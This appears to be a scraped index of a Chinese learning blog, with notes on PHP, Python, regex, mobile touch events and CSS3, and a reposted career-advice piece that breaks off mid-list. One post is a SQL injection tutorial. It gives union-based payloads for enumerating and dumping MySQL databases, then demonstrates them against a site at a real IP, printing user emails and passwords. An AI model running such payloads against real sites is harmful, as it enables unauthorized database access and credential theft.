Trait,可以让我们不使用继承就可以在多个类中复用方法的机制,使用trait来定义一个特质，特质中只能定义方法 定义了特质之后，我们就可以在一个类中使用use来引入这个特质，引入了特质之后，这个类就拥有了这个特质中的方法 trait 可以用来向一个类中添加方法,不用继承就可以实现方法的复用","link":"/2018/11/15/php面向对象容易忘记的几个知识点/"},{"title":"python入门基础语法总结","text":"这篇文章记录一下学习python的一些笔记，偶尔看看预防忘记 定义变量，使用变量 input 用户自己输入值 print 打印值 可以输出多个变量 %d|%s 用于输出变量时占位 字符串(后期爬虫必备) int()把字符串转换为数字 str()把数字转换为字符串 len()获取某个字符占用的字节数 字符串可以用+连接 字符下标可以为负数 str[起始位置:终止位置:步长]切片，从起始开始截取字符串，到终止位置结束，不包括终止位置 str[::-1]倒序 str.find()|rfind 字符串查找 str.index()|rindex()字符串查找，与find不同的是返回的结果不同 str.count(str,start=0,end=len(str))字符串出现的次数 str.replace(“str”,”str”,替换次数)字符串替换，不会影响原字符串 str.split(“ “)字符串切割，参数可以不用写自动切割 str.capitalize()把字符串中的第一个字符大写 str.title()把字符串中每个单词大写 str.startswith(obj)|endswith(obj)判断字符串是否以obj开头|结尾，返回bool str.lower()把所有大写转换为小写 str.upper()把所有小写转换为大写 str.ljust()返回一个原字符串左对齐，并使用空格填充至长度width的新字符串 str.rjust(width)返回一个原字符串右对齐，并使用空格填充至长度width的新字符串 str.center()返回一个原字符串居中对齐，并使用空格填充至长度width的新字符串 str.lstrip()删除字符串开头的空白字符 str.rstrip()删除字符串末尾的空白字符 str.strip()删除字符串两端的空白字符 str.partition()把str分成三部分，str前，str,和str后 str.rpartition()把str分成三部分，str前，str,和str后，从右边开始分 str.splitlines()按照行分割，返回一个各行作为元素的列表 str.isalpha()判断字符串是否都是字母 str.isdigit()判断字符串是否都是数字 str.isalnum()判断字符串是否都是数字或字母 str.isspace()判断字符串是否都是空格 str.join(mystr)每个字符后面添加一个mystr，构建出一个新的字符串 运算符 （+） 加 （ -） 减 （*） 乘 乘号还可以让字符串重复n次 （/） 除 （//） 取商 （%） 取余 （**） 冥 2的十次方1024,2的16次方65536 if语句 判断语句：（if 条件：else 条件：）条件必须加tab键，不然会被当正常代码执行 比较运算符：&gt; | &lt; | &gt;= | &lt;= | != 逻辑运算符 or | and | not if.. elif elif…else… 语句 循环语句 while循环———–print(“”)换行 end=””不换行 for循环—-可以直接循环字符串 break（跳出循环） 与 continue （跳出本次循环） 列表 类似php中的数组 列表=[数据] 列表的增删改查： 列表.append 增加 列表.insert(位置，内容) 增加 列表.extend(列表) 合并列表，也可以用+运算符 列表.pop()删除列表最后一个元素 列表.remove(内容)可以删除指定内容，只删除一次 del 列表[下标]删除指定下标内容 列表[下标]=修改元素 元素 in | not in 列表 判断元素是否在列表 字典 字典={键值对} 字典的增删改查： 增：字典[key]=value 删：del 字典[key] 改：字典[key]=value 查：字典.get[key] 字典.keys :查看字典的key 字典.values :查看字典的values 字典.items()：把字典变为元组 元组 元组=(值) 元组可以把值赋给多个变量：a,b=元组 元组定义的值不支持修改 如果元组只有一个参数，则必须多写一个逗号，不然不是元组 元组可以为空 函数 函数的定义：def 函数名():内容 列表、字典、可以当做全局变量使用 不定长参数(以元组形式保存数据)：def 函数名(*args):内容 不定长参数(以字典形式保存键值对)：def 函数名(**kargs):内容 实参前面可以加*或者**表示拆包 .sort()从小到大排序 .sort(reverse=true)从大到小排序 .reverse()倒序 lambda匿名函数的使用 eval()转换为表达式 交换两个变量的值：可以用第三个变量，也可以不用，如交换a跟b，a=a+b,b=a-b,a=a-b,python也可以这样子写：a,b=b,a 修改可以使用+=,仅限于可变类型，列表和字典 num+=num并不等价于num=num+num 文件操作 open()打开文件 close()关闭文件 read()读取文件 write()写文件 readlines()按照行读数据 readline()只读一行数据 seek(offset,from)定位读写,offset偏移量，from=0文件开头，from=1当前位置，from=2文件末尾，seek实际上就是控制文件指针 tell()获取文件当前指针位置 os.rename()文件重命名 os.remove()删除文件 os.mkdir()创建文件夹 os.getcwd()获取当前操作绝对目录 os.chdir()改变默认操作目录 os.listdir()获取目录列表 os.rmdir()删除文件夹","link":"/2018/11/15/python入门基础语法总结/"},{"title":"python入门之面向对象","text":"python的基础视频看完了，现在学习一下python的OOP编程 类 类的定义：calss name : 类的调用：name() 类属性的调用： 类方法的调用 调用方法时可以把对象传递过去 设置属性或者获取属性时尽量用方法获取或者设置（更安全） __init()__方法 作用：初始化对象 __str()__方法 作用：直接打印对象时，返回对象的描述信息，所以定义该方法时必须加:return 私有方法 直接在方法前面加__ 私有方法只能在类里面调用 __del()__方法 对象销毁时，并且所有引用都结束时，调用 或者在程序结束时调用 sys模块 sys.getrefcount()测量对象引用的个数，得到的结果比实际结果多1 类的继承 使用：在派生类定义的时候，在后面加一个括号，写上基类的名字 方法重写 方法重写时，可以调用基类的方法，格式：基类.方法(self)或者使用super,格式：super().基类方法() 类继承以后私有方法（属性）不被继承 __init()__方法会被继承 多继承：子类拥有多个父类，使用：直接在括号里面写上多个父类 \\类.mro查看类调用方法的顺序(c3算法) 多态 概念： 等到真正调用的时候才真正确定调用的对象是谁 python多态表现不明显,c或者c++体现明显 充分体现了动态型语言的特点 类属性跟实例属性 类属性定义：在类里面定义的属性 python中，一切皆对象，类称为类对象,new出来的类称为实例对象 实例对象里面的属性称为实例属性 类对象里面的属性称为类属性 类对象(属性)只有一个 类对象(属性)如果发生变化，实例对象(属性)也随之变化 实例对象(属性)互不关联 获取类属性，类属性=类名.属性 实例方法,类方法,静态方法 类方法定义：在方法前面添加：@classmethod ,self改成cls 可以通过类的名字调用类方法，还可以通过这个类创建出来的对象调用这个类方法 静态方法定义：在方法前面添加：@staticmethod ,self可以不写123456789101112131415161718192021class Game(object): #类属性 num = 0 #实例方法 def __init__(self): #实例属性 self.name = \"laowang\" #类方法 @classmethod def add_num(cls): cls.num = 100 #静态方法 @staticmethod def print_menu(): print(\"----------------------\") print(\" 穿越火线V11.1\") print(\" 1. 开始游戏\") print(\" 2. 结束游戏\") print(\"----------------------\") 耦合与解耦 理解：联系比较强，比如修改一处代码，另一处也要改，那么这两个地方的耦合就比较强 new方法 创建对象的方法 object.__new__(cls),实例化对象才能执行init方法 __new__(cls)完成创建 __init__(cls)完成初始化 单例模式 创建出来的对象始终指向一个内存地址 示例代码：1234567891011121314151617181920212223class Dog(object): __instance=None # 只实例化一次对象 __init_flag=False # 创建对象 def __new__(cls,name): if cls.__instance==None: cls.__instance=object.__new__(cls) return cls.__instance # 如果不是第一次创建对象则返回上次创建的对象 else : return cls.__instance def __init__(self,name): # 只实例化一次对象 if Dog.__init_flag==False: self.name=name Dog.__init_flag=Truea=Dog(\"哮天犬\")b=Dog(\"小白\")print(id(a))print(a.name)print(id(b))print(b.name) 异常 异常处理：try: except (NameError,xxx) Exception else—-没有异常执行 finally—-最后执行 ctrl+c也是一个异常 异常的传递 raise抛出自定义异常类 if判断时，空值都是假的，不会执行，例如，””,{},[],(),None,0 模块 import与from import的区别 as起别名 print(__name__)，如果是自己调用，打印main,如果是main模块调用，打印模块名字 if __name__==’__main__’ 循环遇到的坑 可能会出现漏删 解决漏删问题，可以找一个列表把要删除的元素保存起来， 我的博客即将搬运同步至腾讯云+社区，邀请大家一同入驻：https://cloud.tencent.com/developer/support-plan?invite_code=2e5vz4xc7o00c","link":"/2018/11/15/python入门之面向对象/"},{"title":"sql注入入门学习(数字型)（连载中）","text":"非宁静无以致远 判断sql注入1231.提交单引号2.and大法和or大法3.加法和减法，加号 %2b 数据库权限判断123and ord(mid(user(),1,1))=114//或者and (select count(*) from mysql.user)&gt;0 判断字段数用union联合查询 12and 1=1 union select 1,2,3,4,5……union select null,null,null..... 用order by 查询 1order by 1,2,3,4 查询库名12345678判断数据库版本and ord(mid(version(),1,1))&gt;51 直接使用mysql自带函数database()查询得到数据库名union select 1,database(),3 limit 1,1得到所有的数据库名union select null,schema_name,null from information_schema.schemata获取第一个库名and 1=2 union select null,schema_name,null from information_schema.schemata limit 0,1 查询表名在MySQL中，表名存放在information_schema数据库下tables表table_name字段中、查表名我们主要用到的是TABLES表 group_concat 123and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='test'或者union select null,table_name,null from information_schema.tables where table_schema='test' 查询字段在MySQL中，字段名存放在information_schema数据库下columns表column_name字段中,这里使用的是columns表。 123and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='test' and table_name='sqltest'或者union select null,column_name,null from information_schema.columns where table_schema='test' and table_name='admin' 查询数据12345and 1=2 union select 1,group_concat(id,user,pwd),3 from admin或者union select null,title,content from sqltest或者and 1=2 union select 1,2,concat(user,0x3c,pwd) from admin 实战演练打开网站http://43.247.91.228/content-1/index.php?id=0,我们在这里做注入练习 1.首先加单引号报错，可知存在明显的注入漏洞 2.输入and ord(mid(user(),1,1))=114不报错，可知数据库的权限是root权限，并且具有可读可写的权限 3.输入 and 1=1 union select 1,2,3,4,5,6,7,8不报错，可以发现这个表的字段有8个 4.使用and 1=2 union select null,schema_name,null ,null,null,null,null,null from information_schema.schemata limit 1,1;--用;--注释了后面的语句，可以获取所有的数据库名，可以知道当前执行查询用户名为root@localhost（user()函数）， 当前使用的数据库是inject，下面列出所有数据库 information_schema inject mysql performance_schema 5.使用union select 1,group_concat(table_name),3,4,5,6,7,8 from information_schema.tables where table_schema='inject' limit 1,1;--获取所有的表名，下面列出所有的表 users 6.使用union select 1,group_concat(table_name),3,4,5,6,7,8 from information_schema.tables where table_schema='inject' limit 1,1;--获取所有的字段，下面列出所有的字段 idusers name email password ua ref host lang 7.接下来就到最后最重要的一步了，获取所有数据，and 1=2 union select 1,group_concat(idusers,name,email,password,ua,ref,host,lang),3,4,5,6,7,8 from users;-- 获取到的数据如下： 10adminadmin@getmantra.comadminBrick_Browserhttp://127.0.0.1/release-channel/content-13/index.php127.0.0.1en,1tomtom@getmantra.comtomBlock_Browser8.8.8.8en,2ronron@getmantra.comronRain_Browser192.168.1.1en,3harryharry@getmantra.com5f4dcc3b5aa765d61d8327deb882cf99Mantra127.0.0.1en 可以看出来这些应该就是数据表中所有的数据了，但是怎么格式化我并不会，希望看到这篇文章的大佬们能帮我解决一下，请给我发邮件：dandingkeji.top@gmail.com","link":"/2018/11/15/sql注入入门学习(数字型)（连载中）/"},{"title":"学习笔记总结","text":"快乐的时间总是短暂的，一转眼，我的学习已经过去了一年多了，期间也做了一些项目，每天感觉自己的进步，喜悦之情是难以克制的，现在把自己过去一年多以来学习做的笔记总结一下，这是我的学习路线，入门或者0基础的朋友可以看看，都是图片，加载不出来的朋友请挂梯子","link":"/2018/11/15/学习笔记总结/"},{"title":"正则表达式常用语法总结","text":"正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本 普通字符 字母、数字、标点符号、键盘特殊符号等 定义字符集 [a-z] 匹配 26 个字母之一 [aeiou] 匹配 aeiou 这 5 个字符其中的某一个字符 [a-zA-Z] 匹配 26 个(大小写)字母中的某一个字母 [a-zA-Z0-9_-] 匹配(大小写)字母、数字、下划线、中横线 的某一个字符 [0-9] 匹配 0 到 9 之间任意一个数字 [9-3] [z-a] 不能从大往小写，有语法错误 shiy 特别字符集 $ 匹配输入字符串的结尾位置（regexBuddy中待测试文本中多行算作一行） ^ (托字符) 匹配字符串的开始位置(托字符) ( ) 匹配一个子表达式的开始和结束位置，模式单元 * 匹配其前面那个单元出现 0 次或以上（任意次数） + 匹配其前面那个单元出现 1 次或以上 \\? 匹配其前面那个单元出现 0 次或 1 次 .点 匹配除换行符 \\n 之外的任何单字符 .* \\ 这个符号是用来转义的 | 指明两项之间的一个选择 组合字符集 \\d 匹配数字 0 到 9 之一，与[0-9]效果一样 \\D 匹配非数字[^0-9]之一 \\w 匹配(大小写)字母、数字、下划线其中一个，与[a-zA-Z0-9_]效果相同 \\W 匹配非字母、数字、下划线之一 \\s 匹配一个空格 \\S 匹配一个非空格 \\b 匹配单词的开始或结束 限制字符集 {m} 匹配其前一单元严格出现 m 次 {m,} 匹配其前一单元出现至少m次，至多不限制,{0,}相等于*，{1,}相等于+ {m,n} 匹配其前一单元出现至少 m，至多 n 次 [^lsjd] 匹配非 lsjd 之中的字符 [^a-f] 匹配非 a 到 f 之间的一个字符 [^定义字符集] 不给匹配定义字符集里边的信息 模式修正符 g 全文查找出现的所有 正在模式内容 （全局匹配） (php 中可以使用 preg_match_all()函数限制全局匹配) i 忽略大小写 m 将匹配内容视为多行 /u 表示按 unicode(utf-8)匹配（主要针对多字节比如汉字） /s 表示将字符串视为单行来匹配 贪婪模式转非贪婪模式通过在 *、+ 或 ? 限定符之后放置?，该表达式从”贪心”表达式转换为”非贪心”表达式或者最小匹配","link":"/2018/11/15/正则表达式常用语法总结/"},{"title":"移动端事件详解","text":"关于移动端事件的一些笔记 移动端事件类型 touchstart事件 touchmove事件 touchend事件 移动端事件对象 touches 屏幕上有几个触点 targetTouches 绑定事件的元素上有几个触点 changedTouches 在屏幕上 改变(位置移动 离开 进入 )的触点的个数(如果手指离开屏幕 只有changedTouched有值 其他都没有) 获取触点坐标 clientX/Y获取的是， 触点相对于可视区的X/Y坐标(不包含滚动)(用的最多) pageX/Y获取的是 ， 触点相对于HTML文档左边沿的的X/Y坐标(包含滚动) screenX/Y获取的是返回触点相对于屏幕左边沿的的X/Y坐标.不包含页面滚动的（screenX/Y有兼容性） 细节: 如果想要clientX/YpageX/Y正确的结果,要写全viewport设置,如果写不全,那么不会得到正确的结果 300ms延迟 形成原因：曾经移动端在萌芽阶段的时候，我们把PC端的网页放到了移动端，苹果公司把PC端的网页进行了缩放，发明了一种浏览缩放网页的处理方案 ，就是双击放大，第一次点击会延迟300ms左右，然后判断，如果有第二次点击，就是放大，如果没有，就是点击 console.time(“timer”)计时器开 console.timeEnd(‘timer’)计时器关 解决方法： 写上 viewport 设置就可以了 用fastClick 移动端判断手指滑动方向 获取到 触点起始点坐标 获取到 触点 结束点坐标 计算 坐标的差值的绝对值 如果 水平坐标的差值的绝对值 大于竖直 就是水平滑动 如果 终止点坐标减去起始点坐标大于0 那么是向 右 否则是向左滑 如果 竖直坐标的差值的绝对值 大于水平 就是竖直滑动 如果 终止点坐标减去起始点坐标大于0 那么是向 下 否则是向上滑 代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; // 1.声明变量 var startX, startY, endX, endY, absX, absY; // 2.给document添加touchstart事件 document.addEventListener(\"touchstart\", function (e) { var touches = e.targetTouches[0]; startX = touches.clientX; startY = touches.clientY; // console.log(startX, startY); }) // 3. 给document添加touchend事件 document.addEventListener(\"touchend\", function (e) { var touches = e.changedTouches[0]; endX = touches.clientX; endY = touches.clientY; // 4. 计算坐标差值的绝对值 absX = Math.abs(endX - startX); absY = Math.abs(endY - startY); if (absX == absY) { return; } // 5. 判断是水平还是垂直 // 6. 如果是水平 判断左右 // 7.如果是垂直 判断上下 var direction = absX &gt; absY ? endX - startX &gt; 0 ? \"向右\" : \"向左\" : endY - startY &gt; 0 ? \"向下\" : \"向上\"; console.log(direction); }) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","link":"/2018/11/15/移动端事件详解/"},{"title":"html5之网络状态检测","text":"在原生APP中,比如QQ,它可以检测QQ是处于在线还是离线状态,但是在网页中,或者早期web app中,没有检测网络状态的能力,因此在HTML5中出现了网络状态检测API 代码123456789101112131415161718192021222324252627&lt;!--addEventListener() 方法用于向指定元素添加事件句柄。--&gt;&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; // online 在线 window.addEventListener(\"online\", function () { alert(\"您的网络状态正常\"); }) // offline 离线 window.addEventListener(\"offline\", function () { alert(\"您的网络状态离线\"); }) // 特殊情况 // 局域网 显示正常 // wifi有的时候标志有惊叹号 虽然不能上网 但是这个api也能用 &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","link":"/2018/11/15/网络状态检测/"},{"title":"css3的一些新属性总结","text":"最近在学习html5以及css3,在这里记录一下学到的一些新的属性，部分内容来自：http://www.w3school.com.cn box-sizing盒子尺寸box-sizing规定了盒子的计算方式，常用于消除hover时，盒子之间的影响，有三个属性：1box-sizing: content-box|border-box|inherit content-box：默认值，表示盒子的尺寸为加上边框以及内边距之后的大小border-box：规定了盒子的大小就是盒子的width以及heightinherit：表示盒子继承父元素box-sizing的值，示例代码：12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .box{ width: 200px; height: 200px; border: 20px solid red; padding: 20px; background-color: yellow; /*此时盒子尺寸为宽度加高度加内边距加边框，为280x280*/ /*box-sizing: content-box;*/ /*此时盒子尺寸为width以及height的值，为200x200*/ box-sizing: border-box; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"box\"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; background-image多背景background-image可以设置多背景，常用于把一张图切成几张图，当成背景，用于网站图片加载可以减轻网站的访问压力，用法如下：123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;多背景&lt;/title&gt; &lt;style&gt; .box{ width: 623px; height: 417px; background-repeat: no-repeat; /*多张图片用逗号隔开*/ background-image: url(images/bg1.png), url(images/bg2.png), url(images/bg3.png), url(images/bg4.png), url(images/bg5.png); background-position: left top, right top, right bottom, left bottom, center center; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"box\"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; background-size背景尺寸background-size可以实现修改背景的尺寸1background-size: length|percentage|cover|contain; length：表示可以用长度宽度设置背景的尺寸percentage：表示可以用百分比设置背景的尺寸以上两种一般是设置两个值，如果只设置一个值，则另一个值为自动cover：保证图片填充满元素，不管图片是否完整contain：保证图片完整显示，不保证是否填充满元素,示例代码：12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .box { width: 500px; height: 500px; box-shadow: 0 0 1px #000; background-image: url(\"./images/1.jpg\"); background-repeat: no-repeat; background-size: contain; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"box\"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; background-origin背景原点background-origin规定了background-position定位的位置1background-origin: padding-box|border-box|content-box; border-box:从边框开始定位padding-box:从内边距开始定位content-box:从盒子内容开始定位，示例代码：123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .box { width: 400px; height: 400px; border: 20px solid rgba(255,0,0,0.5); padding: 20px; background-repeat: no-repeat; background-image: url(\"./images/54.jpg\"); background-origin: content-box; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"box\"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; background-clip背景裁切background-clip控制背景显示多大的区域1background-clip: border-box|padding-box|content-box; border-box:控制图片在border以内的区域也显示padding-box:控制图片在padding以内的区域也显示content-box:控制图片在内容以内的区域显示，示例代码：12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .box { width: 363px; height: 219px; border: 20px solid rgba(255, 0, 0, 0.5); padding: 20px; background-repeat: no-repeat; background-origin: border-box; background-image: url(\"./images/54.jpg\"); background-clip: content-box; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"box\"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; transition过渡过渡: 就是给改变添加过程1transition: property duration timing-function delay; transition-property:规定设置过渡效果的 CSS 属性的名称。transition-duration：规定完成过渡效果需要多少秒或毫秒。transition-timing-function：规定速度效果的速度曲线。transition-delay：定义过渡效果何时开始。代码如下;123456789101112131415161718192021222324252627282930313233343536&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;过渡&lt;/title&gt; &lt;style&gt; .box { width: 20px; height: 80px; background-color: red; /*简单写法*/ /*transition: all 1s;*/ /*专业写法*/ transition-property:width; transition-duration: 1s; transition-delay: 1s; transition-timing-function: ease-in; /* linear 线性 匀速运动 */ /* ease 先快后慢 */ /* ease-in-out 先慢 后快 最后慢 */ /* ease-out 越来越慢 */ /* ease-in 越来越快 */ } .box:hover { width: 800px; background-color: green; } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"box\"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; transform 2D转换transform方法有很多，下面介绍几种最基础的：12345transform: translate(x,y);位置偏移，参数为偏移的距离transform: rotate(0deg);角度偏移，参数为旋转角度，正负对应顺逆时针transform: scale(0.5);缩放转换，参数大于1则放大，小于1则缩小transform-origin：left top;设置转换原点，参数可以是px或者百分比transform: skew(x, y);参数分别问沿着x轴以及y轴倾斜的角度 示例代码如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .box { width: 200px; height: 200px; background-color: red; transform:rotate(100deg); } .box2 { width: 200px; height: 200px; background-color: red; transform: translate(200px, 300px); } .box3 { width: 200px; height: 200px; background-color: red; transition: all 2s; } .box3:hover{ width: 200px; height: 200px; background-color: red; transform: scale(0.5); } .box4{ position: absolute; top: 50%; left: 50%; margin-left: -155px; margin-top: -219px; width: 310px; height: 438px; } img{ width: 200px; position: absolute; bottom: 0; left: 0; box-shadow: 0 0 1px #f7f7f7; transition: all 1s; transform-origin: left top; } .box4:hover img:nth-child(1){ transform: rotate(60deg); } .box4:hover img:nth-child(2){ transform: rotate(120deg); } .box4:hover img:nth-child(3){ transform: rotate(180deg); } .box4:hover img:nth-child(4){ transform: rotate(240deg); } .box4:hover img:nth-child(5){ transform: rotate(300deg); } .box4:hover img:nth-child(6){ transform: rotate(360deg); } .box5{ width: 300px; height: 300px; background-color: yellow; margin-left: 1100px; transform: skew(152deg,60deg); } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"box\"&gt;&lt;/div&gt; &lt;div class=\"box2\"&gt;&lt;/div&gt; &lt;div class=\"box3\"&gt;&lt;/div&gt; &lt;div class=\"box4\"&gt; &lt;img src=\"./images/pk1.png\" alt=\"\"&gt; &lt;img src=\"./images/pk1.png\" alt=\"\"&gt; &lt;img src=\"./images/pk1.png\" alt=\"\"&gt; &lt;img src=\"./images/pk1.png\" alt=\"\"&gt; &lt;img src=\"./images/pk1.png\" alt=\"\"&gt; &lt;img src=\"./images/pk1.png\" alt=\"\"&gt; &lt;/div&gt; &lt;div class=\"box5\"&gt; 66666666666666666666666 &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 动画@keyframes:mymove 5s infinite 自定义动画名称，animation 将动画与 div 元素绑定，animation-iteration-count,控制动画的次数,infinite无数次，animation-delay 控制动画开始时间，animation-play-state 控制动画状态， paused(暂停) running(继续)animation-direction: normal|alternate 控制动画播放是否循环，animation-fill-mode:forwards;控制动画结束时的状态 backwards(回到动画的初始状态) forwards(停留在动画的结束状态)示例代码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; .box { position: relative; width: 500px; height: 500px; border: 2px solid red; margin: 50px auto; } i { position: absolute; top: -9px; left: -9px; width: 18px; height: 18px; background-color: chartreuse; border-radius: 50%; animation: move 3s;l } @keyframes move{ 0% { transform: translate(0px,0px ); } 100%{ transform: translate(500px,0px ); } } &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=\"box\"&gt; &lt;i&gt;&lt;/i&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;","link":"/2018/11/15/css3新特性1/"},{"title":"【收藏】黎活明给程序员的忠告","text":"转载自：https://qq52o.me/1412.html 展望未来，总结过去10年的程序员生涯，给程序员小弟弟小妹妹们的一些总结性忠告走过的路，回忆起来是那么曲折，把自己的一些心得体会分享给程序员兄弟姐妹们，虽然时代在变化，但是很可能你也会走我已经做过的10年的路程，有些心得体会你可以借鉴一下，觉得说得有道理的你就接纳，觉得说得没道理的，你就抛弃，以下是我发自内心的，给大家的忠告，特别是针对那些小弟弟妹妹们。 01. 自己的户口档案、养老保险、医疗保险、住房公积金一定要保管好。由于程序员行业每年跳槽一次，我不隐瞒大家，我至少换过5个以上的单位，这期间跳来跳去，甚至是城市都换过3个。还好户口没丢掉，其他都已经是乱了，好几个城市里，都有交过三金，甚至是一个程序的2个区里交的都有，那些东西，10年后，会变得很重要。你买房子若有公积金，可以取出来，贷款利率也会比较低一些，有孩子了，还需要上学，生病了还需要医疗保险。 特别是买房子时，你要商业贷款与公积金贷款的利率差别还是很大，有可能会有10万的差距。你平时都注意这些，会给你带来的损失会最小，例如每个月缴纳300元的公积金，公司也缴纳300元，你一个月能存下来600元，一年就是7200元，10年就是72000元。我以前都忽视了这些，到我需要买房子时，公积金里可能只有几千元，10年很快就过去了，结果我没能存下来多少公积金，医疗保险，养老金等更别提了，都已经稀里糊涂了，这些损失10年累加起来，是很庞大的数字，大家要注意，跳槽换工作时也要保护好自身的利益，现在房价很贵，你可能是跟我一样，大山里出来打拼的娃子，家里也没有丰厚的积蓄，只有靠自己拼搏，买房子是人生的一件大事，等你到了10年，才想到这个事情，已经晚了，特别是孩子要上学，上幼儿园等，需要户口啥的都要齐全。 02. 不要轻易换笔记本电脑，不要跟潮流，不要买过多的电子产品，不要过于频繁的更换手机。这方面我的经验教训也是惨痛的。我大概前后购买过5-6个笔记本，以前的都是1万多元一台，最近买的是一台是1万多给女朋友的，自己买了一台是7500元左右，手机大概换过接近10个了，这些钱加起来也足够有10万以上了，你可能一不小心就购买了这些电子产品，但是时间长了，你一回过头来想想，你为什么赚得也不少，但是为什么还是那么穷，是因为你购买这些电子产品花费了过多的金钱了，平时笔记本啥的贵重物品要保护好，我一个同事不小心丢了2台笔记本电脑，接近2万的损失啊，你净赚2万，不是那么容易的，这个窟窿不是开玩笑的，我曾经也被人偷了一个崭新的笔记本，损失1.5万左右，更糟糕的是最新的代码也丢了。 03. 这年代外语、学历、职称、驾驶证还是蛮重要的。想找高薪，外资企业是正确的选择，在同样的打工里，外资企业的收入普遍是高的，我就想不明白，我们的赚钱能力怎么就比不过人家了，社会不断发展，将来可能去外国就像串门一样了，也说不定的，外语好将来的就业机会也会更多更广一些。 学历并不代表啥，但是学历也是敲门砖，例如有300个应聘者，那至少重点本科以下的，统统不看了，因为实在是来不及看了，你再厉害也被挡在机会的门外了，同样有时候你想改行什么的，职称也很重要，最起码评个中级职称，说不定还有机会能进入大学或者政府部门还是有可能性。 若有充裕的时间，应该把驾驶证考了，因为你越到后面越忙与工作家庭，没机会学车了也说不定的，平时也别光顾拼命工作，工作10年后你才发现，原来身边的人都至少硕士学历了，你被社会自动淘汰了，我现在就有这个感觉，虽然我带过很多硕士，他们的就业机会比我还好，经常能进入名牌企业，我也一直进不去。 04. 